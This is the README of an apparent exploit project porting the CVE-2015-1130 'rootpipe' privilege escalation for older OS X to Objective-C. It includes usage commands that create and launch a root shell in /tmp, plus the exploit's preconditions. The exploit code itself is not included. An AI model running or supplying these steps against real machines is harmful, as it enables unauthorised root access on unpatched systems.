## rootpipo

Objective-C variant of [CVE-2015-1130](https://truesecdev.wordpress.com/2015/04/09/hidden-backdoor-api-to-root-privileges-in-apple-os-x/), aka _rootpipe_.

`rootpipe` is the exploit.
`rootshell` is a handy root shell launcher.


### Usage

	$ ./rootpipe rootshell /tmp/pipo
	$ /tmp/pipo
	# id


### Limitations

Legacy exploit, i.e. OS X < 10.9, must be run from a logged in __console__ user with __administrator__ privileges, i.e. not through SSH.


### Thanks

Many thanks to _Emil Kvarnhammar_ for publishing the [exploit](https://truesecdev.wordpress.com/2015/04/09/hidden-backdoor-api-to-root-privileges-in-apple-os-x/).

Many thanks to Apple for not back porting the fix:

> Apple indicated that this issue required a substantial amount of changes on their side, and that they will not back port the fix to 10.9.x and older.

